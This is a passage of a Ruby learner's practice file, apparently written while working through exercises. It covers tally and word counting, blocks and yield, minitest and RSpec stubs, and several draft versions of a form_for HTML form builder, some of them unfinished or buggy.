pp tally_one    = order_one.tally
pp tally_two    = order_two.tally
pp weekly_tally = (order_one + order_two).tally





order_one = %i{ pen pencil eraser sharpener pen pen }
order_two = %i{ sharpener eraser eraser eraser eraser sharpener sharpener sharpener sharpener }

pp weekly_tally = {}
pp weekly_tally = order_one.tally
pp weekly_tally = order_two.tally






order = %i{ pen pencil eraser sharpener pen pen }

pp tally = order.tally
pp tally[:ruler]





order = %i{ pen pencil eraser sharpener pen pen }

pp tally = order.tally { puts "Proc called" }
pp tally[:ruler]




order = %i{ pen pencil eraser sharpener pen pen }

pp tally = order.tally





---




pp words = %w(the be to of and a in that have I it for not not not)




word_counts = {}

words.each do |word|
  if word_counts[word]
    word_counts[word] += 1
  else
    word_counts[word] = 1
  end
end

pp word_counts






word_counts = Hash.new(0)
words.each { |word| word_counts[word] += 1 }

pp word_counts






pp words.each_with_object(Hash.new(0)) { |word, word_counts| word_counts[word] += 1 }







----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


hash = {
  somename:  'Enter your name',
  phone:     'Enter your phone',
  date_time: 'Enter date and time',
  barber:    'Choose your barber',
  color:     'Choose color that you need'
}

error = hash.select { |key, value| value == '' }.values.join(', ')

pp error





---




print 'Enter you name: '
username = gets.strip

print 'Enter you phone: '
phone = gets.strip

print 'Enter date_time: '
date_time = gets.strip

print 'Enter you barber: '
barber = gets.strip

print 'Enter you color: '
color = gets.strip

input = {
  somename:   username,
  phone:      phone,
  date_time:  date_time,
  barber:     barber,
  color:      color
}

def validator input
  params = {
    somename:   'Enter your name',
    phone:      'Enter your phone',
    date_time:  'Enter date and time',
    barber:     'Choose your barber',
    color:      'Choose color that you need'
  }

  input.each do |name, value|
    if input[name] == ''
      puts params[name]
    end
  end
end

input.each { |name, value| puts "#{name} #{value}" }



validator input





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-----------------
webmick, minitest
-----------------


require 'minitest/autorun'

def test_stale_eh
  obj_under_test = Something.new
  refute obj_under_test.stale?

  Time.stub :now, Time.at(0) do
    assert obj_under_test.stale?
  end
end





---




require 'minitest/autorun'
require 'webmock/minitest'

class Book
  attr_accessor :title

  def initialize title
    @title = title
  end
end


class IpgeobaseTest < Minitest::Test
  def test_uri
    book = Book.new('War and Peace')

    book.stub(:title, 'War and Peace') do
      assert_equal 'War and Peace', book.title
    end
  end
end





---




class ClassRoom
  def initialize students
    @students = students
  end

  def list_student_names
    @students.map(&:name).join(',')
  end
end

describe ClassRoom do
  it 'the list_student_names method should work correctly' do
    student_1 = double('student')
    student_2 = double('student')

    student_1.stub(:name).and_return('John Smith')
    student_2.stub(:name).and_return('Jill Smith')

    class_room = ClassRoom.new [studen_t1, student_2]

    expect(class_room.list_student_names).to eq('John Smith,Jill Smith')
  end
end






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

------------------------
time, datetime, time.now
------------------------


time = Time.new
week_day = time.wday

if time.wday == 6
  week_day = "It's Saturday!"
elsif time.wday == 0
  week_day = "It's Sunday!"
else
  week_day = "It's not a weekend!"
end

print 'What is the day today? (Press enter): '
press = gets.strip

pp week_day if press == ''






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


file = File.open 'trump.txt', 'r'

@hash = {}

def add_to_hash word
  unless word.empty?
    word.downcase!

    count = @hash[word].to_i
    count += 1

    @hash[word] = count
  end
end

file.each_line do |line|
  array = line.split(/\s|\n|\.|\,|\(|\)|\-|\$/)
  array.each { |word| add_to_hash(word) }
end

pp @hash

puts

@hash.each do |name, value|
  puts "#{value} #{name}"
end

file.close





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-----
yield
-----


def yield_name(name)
  puts "In the method! Let's yield."
  yield('Kim')
  puts 'In between the yields!'
  yield(name)
  puts 'Block complete! Back in the method.'
end

yield_name('Eric') { |name| puts "My name is #{name}." }
yield_name('Gor') {|name| puts "My name is #{name}"}





---




def double(number)
  yield(number)
end

double(16) { |number| puts number * 2 }





---




def greeter
  yield
end

phrase = Proc.new { puts 'hey there' }
greeter(&phrase)





---




def run_5_times
  5.times do
    yield
  end
end

run_5_times { pp 'Something' }
puts

def run_6_times
  index = 0
  while index < 6
    yield index, 33
    index += 1
  end
end

run_6_times { |index, value| pp "Something else, index: #{index} value: #{value}" }





---




def get_website_contents
  puts '<body>'
  yield
  puts '</body>'
end

get_website_contents do
  puts 'something!!!'
  puts 'i want more'
end




----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-------------
form builders
-------------


class AppFormBuilder < ActionView::Helpers::FormBuilder
  delegate :tag, :safe_join, to: :@template

  def input(method, options = {})
    @form_options = options
    object_type = object_type_for_method(method)

    input_type = case object_type
    when :date then :string
    when :integer then :string
    else object_type
    end

    override_input_type = if options[:as]
      options[:as]
    elsif options[:collection]
      :select
    end

    send("#{override_input_type || input_type}_input", method, options)
  end

  private

  def form_group(method, options = {}, &block)
    tag.div class: "form-group #{method}" do
      safe_join [
        block.call,
        hint_text(options[:hint]),
        error_text(method),
      ].compact
    end
  end

  def hint_text(text)
    return if text.nil?
    tag.small text, class: "form-text text-muted"
  end

  def error_text(method)
    return unless has_error?(method)

    tag.div(@object.errors[method].join("<br />").html_safe, class: "invalid-feedback")
  end

  def object_type_for_method(method)
    result = if @object.respond_to?(:type_for_attribute) && @object.has_attribute?(method)
      @object.type_for_attribute(method.to_s).try(:type)
    elsif @object.respond_to?(:column_for_attribute) && @object.has_attribute?(method)
      @object.column_for_attribute(method).try(:type)
    end

    result || :string
  end

  def has_error?(method)
    return false unless @object.respond_to?(:errors)
    @object.errors.key?(method)
  end

  # Inputs and helpers

  def string_input(method, options = {})
    form_group(method, options) do
      safe_join [
        (label(method, options[:label]) unless options[:label] == false),
        string_field(method, merge_input_options({class: "form-control #{"is-invalid" if has_error?(method)}"}, options[:input_html])),
      ]
    end
  end

  def text_input(method, options = {})
    form_group(method, options) do
      safe_join [
        (label(method, options[:label]) unless options[:label] == false),
        text_area(method, merge_input_options({class: "form-control #{"is-invalid" if has_error?(method)}"}, options[:input_html])),
      ]
    end
  end

  def boolean_input(method, options = {})
    form_group(method, options) do
      tag.div(class: "custom-control custom-checkbox") do
        safe_join [
          check_box(method, merge_input_options({class: "custom-control-input"}, options[:input_html])),
          label(method, options[:label], class: "custom-control-label"),
        ]
      end
    end
  end

  def collection_input(method, options, &block)
    form_group(method, options) do
      safe_join [
        label(method, options[:label]),
        block.call,
      ]
    end
  end

  def select_input(method, options = {})
    value_method = options[:value_method] || :to_s
    text_method = options[:text_method] || :to_s
    input_options = options[:input_html] || {}

    multiple = input_options[:multiple]

    collection_input(method, options) do
      collection_select(method, options[:collection], value_method, text_method, options, merge_input_options({class: "#{"custom-select" unless multiple} form-control #{"is-invalid" if has_error?(method)}"}, options[:input_html]))
    end
  end

  def grouped_select_input(method, options = {})
    # We probably need to go back later and adjust this for more customization
    collection_input(method, options) do
      grouped_collection_select(method, options[:collection], :last, :first, :to_s, :to_s, options, merge_input_options({class: "custom-select form-control #{"is-invalid" if has_error?(method)}"}, options[:input_html]))
    end
  end

  def file_input(method, options = {})
    form_group(method, options) do
      safe_join [
        (label(method, options[:label]) unless options[:label] == false),
        custom_file_field(method, options),
      ]
    end
  end

  def collection_of(input_type, method, options = {})
    form_builder_method, custom_class, input_builder_method = case input_type
    when :radio_buttons then [:collection_radio_buttons, "custom-radio", :radio_button]
    when :check_boxes then [:collection_check_boxes, "custom-checkbox", :check_box]
    else raise "Invalid input_type for collection_of, valid input_types are \":radio_buttons\", \":check_boxes\""
    end

    form_group(method, options) do
      safe_join [
        label(method, options[:label]),
        tag.br,
        (send(form_builder_method, method, options[:collection], options[:value_method], options[:text_method]) do |b|
          tag.div(class: "custom-control #{custom_class}") {
            safe_join [
              b.send(input_builder_method, class: "custom-control-input"),
              b.label(class: "custom-control-label"),
            ]
          }
        end),
      ]
    end
  end

  def radio_buttons_input(method, options = {})
    collection_of(:radio_buttons, method, options)
  end

  def check_boxes_input(method, options = {})
    collection_of(:check_boxes, method, options)
  end

  def string_field(method, options = {})
    case object_type_for_method(method)
    when :date then
      birthday = method.to_s =~ /birth/
      safe_join [
        date_field(method, merge_input_options(options, {data: {datepicker: true}})),
        tag.div {
          date_select(method, {
            order: [:month, :day, :year],
            start_year: birthday ? 1900 : Date.today.year - 5,
            end_year: birthday ? Date.today.year : Date.today.year + 5,
          }, {data: {date_select: true}})
        },
      ]
    when :integer then number_field(method, options)
    when :string
      case method.to_s
      when /password/ then password_field(method, options)
      # when /time_zone/ then :time_zone
      # when /country/   then :country
      when /email/ then email_field(method, options)
      when /phone/ then telephone_field(method, options)
      when /url/ then url_field(method, options)
      else
        text_field(method, options)
      end
    end
  end

  def custom_file_field(method, options = {})
    tag.div(class: "input-group") {
      safe_join [
        tag.div(class: "input-group-prepend") {
          tag.span("Upload", class: "input-group-text")
        },
        tag.div(class: "custom-file") {
          safe_join [
            file_field(method, options.merge(class: "custom-file-input", data: {controller: "file-input"})),
            label(method, "Choose file...", class: "custom-file-label"),
          ]
        },
      ]
    }
  end

  def merge_input_options(options, user_options)
    return options if user_options.nil?

    # TODO handle class merging here
    options.merge(user_options)
  end
end





---





require 'active_support/all'

module HexletCode
  class Tag
    def self.build(name, **attributes)
      attributes = attributes.map { |attr, value| " #{attr}='#{value}'" }
      tag = []

      tag << "<#{name}"
      tag << attributes.join
      tag << '>' if !unpaired?(name)
      tag << yield if block_given?
      unpaired?(name) ? tag << '>' : tag << "</#{name}>"
      tag.join
    end

    def self.unpaired?(tag)
      unpaired = %w[ br hr img input meta area base col embed link param source track command keygen menuitem wbr ]
      unpaired.include?(tag) ? true : false
    end
  end
end

module HexletCode
  class << self
    def form_for(struct, url = {}, &block)
      @params = struct.to_h
      form = []

      if url.key?(:url)
        form << "<form action='#{url.fetch(:url)}' method='post'>\n"
        form << instance_eval(&block)
        form << "\n</form>\n"
      else
        form << "<form action='#' method='post'>\n"
        form << instance_eval(&block)
        form << "\n</form>\n"
      end
      form.join
    end

    def input(param_name, **field_options)
      @params.merge! field_options
      input = []

      @params.each_with_object({}) do |(name, value), hash|
        case field_options[:as]
        when :text
          hash[name] =
            "name='#{name}' cols='#{field_options.fetch(:cols, 20)}' rows='#{field_options.fetch(:rows, 40)}'"
        else
          hash[name] = "name='#{name}' type='text' value='#{value}'"
        end
      end

      @params.map do |name, value|
        if name == param_name
          case field_options[:as]
          when :text
            input << label(param_name)
            input << "  <textarea "
            input << "name='#{name}' cols='#{field_options.fetch(:cols, 20)}' rows='#{field_options.fetch(:rows, 40)}'"
            input << ">"
            input << @params.fetch(param_name)
            input << "</textarea>"
          else
            input << label(param_name)
            input << "  <input "
            input << "name='#{name}' type='text' value='#{value}'"
            input << field_options.map { |option_name, value| " #{option_name}='#{value}'" }
            input << ">"
          end
        end
      end
      input.join
    end

    def submit(*button_name)
      submit = []

      submit << "  <input type='submit'"
      submit << " name='#{button_name.present? ? button_name.join : 'Save'}'>"
    end

    def label(param_name)
      label = []

      label << "  <label for='#{param_name.to_s}'>"
      label << param_name.to_s.capitalize
      label << "</label>\n"
    end
  end
end


User = Struct.new(:name, :job, :gender, keyword_init: true)
user = User.new(name: 'rob', job: 'hexlet', gender: 'm')



html = HexletCode.form_for user do |f|
  f.input :name
  f.input :job, as: :text
end

# <form action="#" method="post">
#   <input name="name" type="text" value="rob">
#   <textarea name="job" cols="20" rows="40">hexlet</textarea>
# </form>
print html


html = HexletCode.form_for user, url: '#' do |f|
  f.input :name, class: 'user-input'
  f.input :job
end

# <form action="#" method="post">
#   <input name="name" type="text" value="rob" class="user-input">
#   <input name="job" type="text" value="hexlet">
# </form>
print html


html = HexletCode.form_for user, url: '/users' do |f|
  f.input :job, as: :text, rows: 50, cols: 50
end

# <form action="#" method="post">
#   <textarea cols="50" rows="50" name="job">hexlet</textarea>
# </form>
print html


html = HexletCode.form_for user, url: '/users/path' do |f|
  f.input :name
  f.input :job, as: :text

  # f.input :age
end

# =>  `public_send': undefined method `age' for #<struct User id=nil, name=nil, job=nil> (NoMethodError)
print html



html = HexletCode.form_for user do |f|
  f.input :name
  f.input :job
  f.submit
end

# <form action="#" method="post">
#   <label for="name">Name</label>
#   <input name="name" type="text" value="">
#   <label for="job">Job</label>
#   <input name="job" type="text" value="hexlet">
#   <input type="submit" value="Save">
# </form>
print html


html = HexletCode.form_for user, url: '#' do |f|
  f.input :name
  f.input :job
  f.submit 'Wow'
end

# <form action="#" method="post">
#   <label for="name">Name</label>
#   <input name="name" type="text" value="">
#   <label for="job">Job</label>
#   <input name="job" type="text" value="hexlet">
#   <input type="submit" value="Wow">
# </form>
print html





---





def sum *args
  pp yield(args.sum)
end

sum(1, 2) do |param|
  param.to_s
end





module Model
  def self.included base
    base.extend ClassMethods
  end

  attr_accessor :attributes

  module ClassMethods
    attr_reader :upcased

    def up attribute_name
      @upcased ||= []

      define_method "#{attribute_name}" do
        @attributes[attribute_name]
      end
      define_method "#{attribute_name}=" do |value|
        @attributes[attribute_name] = value
        value.upcase! if self.class.upcased.include? attribute_name
      end
      @upcased << attribute_name
    end
  end

  def initialize params
    @attributes = {}

    params.each do |name, value|
      @attributes[name] = value
      value.upcase! if self.class.upcased.include? name
    end
  end
end

class FuckSomebody
  include Model

  up :who

  def self.fuck word
    @result = []
    word = 'fuck'

    @result << word

    pp @result.join(' ')
  end

  def self.who person
    # @result << person.attributes

    # pp @result.join(' ')
  end

  def self.add_or_check_person name
    define_method name do
      instance_variable_get "@#{name}"
    end
    define_method "#{name}=" do |value|
      instance_variable_set "@#{name}", value
    end
  end

  add_or_check_person :me
  add_or_check_person :you
end

someone = FuckSomebody.new(you: 'you', me: 'me')

pp someone.attributes
pp someone.you
pp someone.me

# FuckSomebody.fuck someone do |person|
#   person.who
# end

FuckSomebody.who someone do |person|
  pp person.upcased :you
end





---






module InputType
  def initialize attrs = {}
    @attributes = {}

    self.class.attribute_options.each do |name, options|
      value = attrs.key?(name) ? attrs[name] : options.fetch(:default, nil)
      write_attribute(name, value)
    end
  end

  def write_attribute(name, value)
    options = self.class.attribute_options[name]
    @attributes[name] = self.class.convert(value, options[:as])
  end

  module ClassMethods
    def attribute_options
      @attribute_options || {}
    end

    def attribute(name, options = {})
      @attribute_options ||= {}
      @attribute_options[name] = options

      define_method "#{name}" do
        @attributes[name]
      end

      define_method "#{name}=" do |value|
        write_attribute(name, value)
      end

      def convert(value, as)
        return value if value.nil?
        result = []

        case as
        when :text
          result << "<input type='text'>"
        when :textarea
          result << "<input type='textarea'>"
        when :submit
          result << "<input type='submit'>"
        end

        result.join
      end
    end
  end

  def self.included(base)
    base.attr_accessor :attributes
    base.extend(ClassMethods)
  end
end


class Form
  include InputType

  attribute :input,  as: :text
  attribute :area,   as: :textarea
  attribute :submit, as: :submit
end

form_1 = Form.new input: 1, area: 2, submit: 3

pp form_1



pp form_1.input
pp form_1.area
pp form_1.submit



form_2 = Form.new input: 11 do |f|
  pp f.input
end



pp form_2





---






require 'active_support/all'

module HexletCode
  class Tag
    def self.build(name, **attributes)
      attributes = attributes.map { |attr, value| " #{attr}='#{value}'" }
      tag = []

      tag << "<#{name}"
      tag << attributes.join
      tag << '>' if !unpaired?(name)
      tag << yield if block_given?
      unpaired?(name) ? tag << '>' : tag << "</#{name}>"
      tag.join
    end

    def self.unpaired?(tag)
      unpaired = %w[ br hr img input meta area base col embed link param source track command keygen menuitem wbr ]
      unpaired.include?(tag) ? true : false
    end
  end
end

pp HexletCode::Tag.build('br')
pp HexletCode::Tag.build('img', src: 'path/to/image')
pp HexletCode::Tag.build('input', type: 'submit', value: 'Save')
pp HexletCode::Tag.build('label') { 'Email' }
pp HexletCode::Tag.build('label', for: 'email') { 'Email' }
pp HexletCode::Tag.build('div')






module HexletCode
  class << self
    def form_for struct, url={}, &block
      @params = struct.to_h

      if url.key?(:url)
        puts "<form action='#{url.fetch(:url)}' method='post'>"
        print instance_eval(&block)
        print '</form>'
      else
        puts "<form action='#' method='post'>"
        print instance_eval(&block)
        print '</form>'
      end
    end

    def input param_name, **field_options
      @params.merge! field_options

      @field_attributes = @params.each_with_object({}) do |(name, value), hash|
        case field_options[:as]
        when :text then hash[name] = "name='#{name}' cols='#{field_options.fetch(:cols, 20)}' rows='#{field_options.fetch(:rows, 40)}'"
        else
          hash[name] = "name='#{name}' type='text' value='#{value}'"
        end
      end
      field_constructor param_name, **field_options

      puts @field.join
    end

    def field_constructor param_name, **field_options
      public_send(param_name, self.struct) if !@params[param_name]

      @field = []

      case field_options[:as]
      when :text
        @field << '  <textarea '
        @field << @field_attributes.fetch(param_name)
        @field << '>'
        @field << @params.fetch(param_name)
        @field << '</textarea>'
      else
        @field << '  <input '
        @field << @field_attributes.fetch(param_name)
        field_options.map { |option_name, value| @field << " #{option_name}='#{value}'" }
        @field << '>'
      end
    end
  end
end


User = Struct.new(:name, :job, :gender, keyword_init: true)
user = User.new(name: 'rob', job: 'hexlet', gender: 'm')



HexletCode.form_for user do |f|
  f.input :name
  f.input :job, as: :text
end

# <form action="#" method="post">
#   <input name="name" type="text" value="rob">
#   <textarea name="job" cols="20" rows="40">hexlet</textarea>
# </form>

# html





html_2 = HexletCode.form_for user, url: '#' do |f|
  f.input :name, class: 'user-input'
  f.input :job
end

# <form action="#" method="post">
#   <input name="name" type="text" value="rob" class="user-input">
#   <input name="job" type="text" value="hexlet">
# </form>

puts html_2




html_3 = HexletCode.form_for user, url: '/users' do |f|
  f.input :job, as: :text, rows: 50, cols: 50
end

# <form action="#" method="post">
#   <textarea cols="50" rows="50" name="job">hexlet</textarea>
# </form>

puts html_3




html_4 = HexletCode.form_for user, url: '/users/path' do |f|
  f.input :name
  f.input :job, as: :text

  # f.input :age
end

# =>  `public_send': undefined method `age' for #<struct User id=nil, name=nil, job=nil> (NoMethodError)

puts html_4






---






module InputType
  def initialize attrs = {}
    @attributes = {}

    self.class.attribute_options.each do |name, options|
      value = attrs.key?(name) ? attrs[name] : options.fetch(:default, nil)
      write_attribute(name, value)
    end
  end

  def write_attribute(name, value)
    options = self.class.attribute_options[name]
    @attributes[name] = self.class.convert(value, options[:as])
  end

  module ClassMethods
    def attribute_options
      @attribute_options || {}
    end

    def attribute(name, options = {})
      @attribute_options ||= {}
      @attribute_options[name] = options

      define_method "#{name}" do
        @attributes[name]
      end

      define_method "#{name}=" do |value|
        write_attribute(name, value)
      end

      def convert(value, as)
        return value if value.nil?
        result = []

        case as
        when :text
          result << "<input name='name' type='text' value='value'>"
        when :textarea
          result << "<input name='name' type='textarea' value='value'>"
        when :submit
          result << "<input name='name' type='submit' value='value'>"
        end

        result.join
      end
    end
  end

  def self.included(base)
    base.attr_accessor :attributes
    base.extend(ClassMethods)
  end
end


class Form
  include InputType

  attribute :input, as: :text
  attribute :area, as: :textarea
  attribute :submit, as: :submit
end

form_1 = Form.new(input: 1, area: 2, submit: 3)

pp form_1



form_1.input do |f|
  pp f
end



pp form_1.input
pp form_1.area
pp form_1.submit




form_1.input do |f|
  pp f
end






class NewForm
  extend InputType
end

form_2 = NewForm.new do |f|
  pp f.inspect
end

pp form_2







---






require 'active_support/all'

module HexletCode
  class Tag
    def self.build(name, **attributes)
      attributes = attributes.map { |attr, value| " #{attr}='#{value}'" }
      tag = []

      tag << "<#{name}"
      tag << attributes.join
      tag << '>' if !unpaired?(name)
      tag << yield if block_given?
      unpaired?(name) ? tag << '>' : tag << "</#{name}>"
      tag.join
    end

    def self.unpaired?(tag)
      unpaired = %w[ br hr img input meta area base col embed link param source track command keygen menuitem wbr ]
      unpaired.include?(tag) ? true : false
    end
  end
end

pp HexletCode::Tag.build('br')
pp HexletCode::Tag.build('img', src: 'path/to/image')
pp HexletCode::Tag.build('input', type: 'submit', value: 'Save')
pp HexletCode::Tag.build('label') { 'Email' }
pp HexletCode::Tag.build('label', for: 'email') { 'Email' }
pp HexletCode::Tag.build('div')
puts
puts

module HexletCode
  attr_accessor :attributes, :input, :form

  def initialize params
    @attributes = {}

    params.each do |name, value|
      @attributes[name] = value
    end
  end

  class << self
    def form_for(struct, url={}, *attributes)
      @form = []

      if url.key?(:url)
        url.each_pair do |_name, value|
          @form << "<form action='#{value}' method='post'>"
          @form << "\n\t#{input struct}\n"
          @form << '</form>'
        end
      else
        @form << "<form action='#' method='post'>"
        @form << "\n\t#{input struct}\n"
        @form << '</form>'
      end

      @form.join
    end

    def input(struct, *attributes)
      @input = []

      struct.each_pair do |name, value|
        pp name
        attributes << "#{name}='#{value}'"
      end

      @input << "<input "
      @input << attributes.join(' ')
      @input << ">"

      @input.join
    end
  end
end


User = Struct.new(:name, :job, :gender, keyword_init: true)
user = User.new(name: 'rob', job: 'hexlet', gender: 'm')

html = HexletCode.form_for user do |f|
  puts f
  f.input :name
  # f.input :job, as: :text
end

# <form action="#" method="post">
#   <input name="name" type="text" value="rob">
#   <textarea name="job" cols="20" rows="40">hexlet</textarea>
# </form>
puts html
# puts html.attributes
puts

html_2 = HexletCode.form_for user, url: '#' do |f|
  # f.input :name, class: 'user-input'
  # f.input :job
  # f.submit
end

# <form action="#" method="post">
#   <input name="name" type="text" value="rob" class="user-input">
#   <input name="job" type="text" value="">
# </form>
puts html_2
puts

html_3 = HexletCode.form_for user, url: '/users' do |f|
  # f.input :job, as: :text, rows: 50, cols: 50
end

# <form action="/users" method="post">
#   <textarea cols="50" rows="50" name="job">hexlet</textarea>
# </form>
puts html_3
puts

html_4 = HexletCode.form_for user, url: '/users/path' do |f|
  # f.input :name
  # f.input :job, as: :text
  # # Поля age у пользователя нет
  # f.input :age
end
# =>  `public_send': undefined method `age' for #<struct User id=nil, name=nil, job=nil> (NoMethodError)
puts html_4






---





class Plane
  def initialize
  end

  def call a, b, *attributes
    points = []

    a = { lat: 50 }
    b = { lon: 87 }

    attributes << a
    attributes << b

    points << a
    points << b

    points.join(' ')
  end
end



class Navigator
  attr_accessor :route_strategy, :type

  def initialize type=:plane
    @type = type
  end

  def build_route a, b
    points = []
    points = route_strategy.new.call a, b

    return points
  end
end

pp navigator = Navigator.new


pp navigator.route_strategy = Plane


pp navigator.build_route :a, :b
pp navigator.type





---




require 'date'

class Car
  attr_accessor :attributes

  def initialize(attrs = {})
    @attributes = {}

    @attributes.each do |attribute|
      attribute.attribute_options.each do |name, options|
        value = attrs.key?(name) ? attrs[name] : options.fetch(:default, nil)
        write_attribute(name, value)
      end
    end
  end

  def write_attribute(name, value)
    @attributes.each do |attribute|
      options = attribute.attribute_options[name]
      @attributes[name] = convert(value, options[:type])
    end
  end

  def attribute_options
    @attribute_options || {}
  end

  def attribute(name, options = {})
    @attribute_options ||= {}
    @attribute_options[name] = options

    define_singleton_method "#{name}" do
      @attributes[name]
    end

    define_singleton_method "#{name}=" do |value|
      write_attribute(name, value)
    end

    def convert(value, target_type)
      return value if value.nil?

      case target_type
      when :datetime
        DateTime.parse value
      when :string
        String value
      when :integer
        Integer value
      when :boolean
        !!value
      end
    end
  end
end



car = Car.new(
  id:         '1',
  title:      'First Post',
  body:       'Hello, World!',
  created_at: '01/03/2021',
  published:  'true'
)

pp car
pp car.attributes
pp car.attribute_options




pp car.attribute :created_at, type: :datetime
pp car.attribute_options



car.attributes do |c|
  pp c.attribute :created_at, type: :datetime
  pp c.attribute_options
end




pp car





---




module Model
  attr_accessor :attributes

  module ClassMethods
    attr_reader :upcased

    def upcase attribute_name
      @upcased ||= []

      define_method "#{attribute_name}" do
        @attributes[attribute_name]
      end
      define_method "#{attribute_name}=" do |value|
        @attributes[attribute_name] = value
        value.upcase! if self.class.upcased.include? attribute_name
      end

      @upcased << attribute_name
    end
  end

  def initialize params
    @attributes = {}

    params.each do |name, value|
      @attributes[name] = value
      value.upcase! if self.class.upcased.include? name
    end
  end

  def self.included base
    base.extend ClassMethods
  end
end

class Article
  include Model

  upcase :title
  upcase :author
end



article = Article.new(
  title:   'article',
  author:  'John',
  chapter: 'first'
)

pp article


pp article.title
pp article.author
puts

pp article.attributes


pp Article.upcased




class Post
  # extend Model

  attr_accessor :options, :up, :back, :result

  def initialize options
    @options = options
  end

  def self.downcase **options, &block
    pp options
  end

  def self.up **options
    @options = options

    yield
  end

  def back key, **args
    value = @options[key]
    value_2 = args[key]

    @result = []

    @options = @options.merge! args

    @result << @options.fetch(key, value)
    @result << args.values.join(' ')

    case key
    when key
      value || value_2 ? @result : 'no-value'
    end
    @result.join(' ')
  end
end

Post.downcase title: 'post', author: 'Alice', chapter: 'last'
Post.downcase title: 'Post', author: 'Alice', chapter: 'Last' do |p|
  pp p.back :title
  pp p
end

Post.up title: 'the-post', author: 'Alice', chapter: 'Last' do |p|
  # pp p.back :title
  pp p
  pp p
end



post = Post.new title: 'the-post', author: 'Alice', chapter: 'Last'
pp post

post.up do |p|
  pp p
end

post.back :title, author: 'I' do |f|
  pp f
  pp f.downcase
  pp f.up
end





---




class Backer
  attr_accessor :params

  def initialize params
    @params = params
  end

  def back key, **options
    value = @params[key]
    value_2 = options[key]

    @params = @params.merge! options

    params_values = []
    attributes_values = []
    all_values = []

    params_values << @params.fetch(key, value)
    attributes_values << options.values.join(' ')

    all_values << params_values
    all_values << attributes_values

    value || value_2 ? all_values.join(' ').strip : "no-params-value #{attributes_values.join(' ').strip}"
  end
end



backer = Backer.new one: 'first', two: 'second'

pp backer
pp backer.back :one
pp backer.back :two
pp backer.back :three
puts

pp backer.params



pp backer.back :one, class: 'text-muted'
pp backer.back :two, class: 'text-muted', attribute_name: 'attribute_value'
pp backer.back :four, class: 'text-muted'
puts

pp backer


pp backer.params




second_backer = Backer.new two: 'second', next: 'the-next' do |f|
  pp f
end

second_backer.back :two do |b|
  pp b
end





---




class General
  attr_accessor :params

  def initialize params
    @params = params
  end

  def create **params
    yield
    # yield update :second, class: 'ccc'
  end

  def update key, **params
    value = @params[key]
    params_value = params[key]

    @params.merge! params

    init_params = []
    update_params = []
    all_params = []

    init_params << @params.fetch(key, value)
    update_params << params.values.join(' ')

    all_params << init_params
    all_params << update_params

    puts value || params_value ? all_params.join(' ').strip : "no-value #{update_params.join(' ').strip}"
  end
end

general = General.new first: 'one', second: 'two' do |f|
  pp f
end




pp general
pp general.params



general.update :first, class: 'some-class'



general.create do |f|
  # pp f
  # f.update :first, class: 'another-some'
end






module Major

  class << self
    def create **params
      @params = params
      # yield if block_given?
      # yield update :second, class: 'ccc'
    end

    def update key, **params
      value = @params[key]
      params_value = params[key]

      @params.merge! params

      init_params = []
      update_params = []
      all_params = []

      init_params << @params.fetch(key, value)
      update_params << params.values.join(' ')

      all_params << init_params
      all_params << update_params

      puts value || params_value ? all_params.join(' ').strip : "no-value #{update_params.join(' ').strip}"
    end
  end
end

major = Major.create a: 'aa', b: 'bb'
pp major

major_with_block = Major.create c: 'cc', d: 'dd' do |f|
  pp f
end




major_2 = Major.create e: 'ee', g: 'gg' do |f|
  f
end

major_2 = Major.update :g, class: 'wow'





---




class Backer
  def back collection
    @collection = []

    collection.each do |element|
      @collection << element if yield element
    end
  end
end

collection = %w[ one two three four ]

backer = Backer.new

backer.back collection do |element|
  pp element.upcase if element[0] == 'o'
  pp element.upcase if element[0] == 'f'
end






class Form
  attr_reader :input

  def form_for key, params
    @form = []

    @form << "<form action='#' method='post'>"
    @form << "\n\t#{yield input(key, params)}\n"
    @form << '</form>'

    puts @form.join
  end

  def input key, params, **options
    @input = []

    attributes = params.each_with_object({}) do |(name, value), hash|
      hash[name] = "name='#{name}' type='text' value='#{value}'"
    end

    value = attributes[key]

    @input << '<input '
    @input << attributes.fetch(key)
    @input << options.values if options
    @input << '>'

    puts @input.join
  end
end

user_params = { name: 'rob', job: 'hexlet', gender: 'm' }
form = Form.new
pp form



form.form_for :name, user_params do |f|
  f
end



form.input :job, user_params do |f|
  f
end






class HashBacker
  def hack options
    @options = {}

    options.each_with_object([]) do |(name, value), array|
      array << value if yield value
    end
  end
end

user_params = { name: 'rob', job: 'hexlet', gender: 'm' }

hash_backer = HashBacker.new

hash_backer.hack user_params do |element|
  pp element.upcase if element[0] == 'h'
  pp element
end






class FormBuilder
  def initialize params
    @params = params
  end

  def form &block
    print "<form url='/path' method='post'>\n"
    print instance_eval(&block)
    print '</form>'
  end

  def input param_name, **options
    @params.merge! options
    input = []

    attributes = @params.each_with_object({}) do |(name, value), hash|
      case options[:as]
      when :text
        hash[name] = "name='#{name}' cols='#{options.fetch(:cols, 20)}' rows='#{options.fetch(:rows, 40)}'"
      else
        hash[name] = "name='#{name}' type='text' value='#{value}'"
      end
    end

    case options[:as]
    when :text
      input << '  <textarea '
      input << attributes.fetch(param_name)
      input << '>'
      input << @params.fetch(param_name)
      input << '</textarea>'
    else
      input << '  <input '
      input << attributes.fetch(param_name)
      options.map { |option_name, value| input << " #{option_name}='#{value}'" }
      input << '>'
    end

    puts input.join
  end
end


user = FormBuilder.new name: 'rob', job: 'hexlet', gender: 'm'

user.form do |f|
  f.input :job, class: 'www'
  f.input :name
  f.input :gender, as: :text, rows: 56, cols: 77
  f.input :job, as: :text
end







class FormBuilder
  def initialize params
    @params = params
  end

  def form &block
    form = []
    form << "<form url='/path' method='post'>\n"
    form << instance_eval(&block)
    form << '</form>'
    pp form
  end

  def input param_name, **options
    @params.merge! options
    input = []

    attributes = @params.each_with_object({}) do |(name, value), hash|
      case options[:as]
      when :text
        hash[name] = "name='#{name}' cols='#{options.fetch(:cols, 20)}' rows='#{options.fetch(:rows, 40)}'"
      else
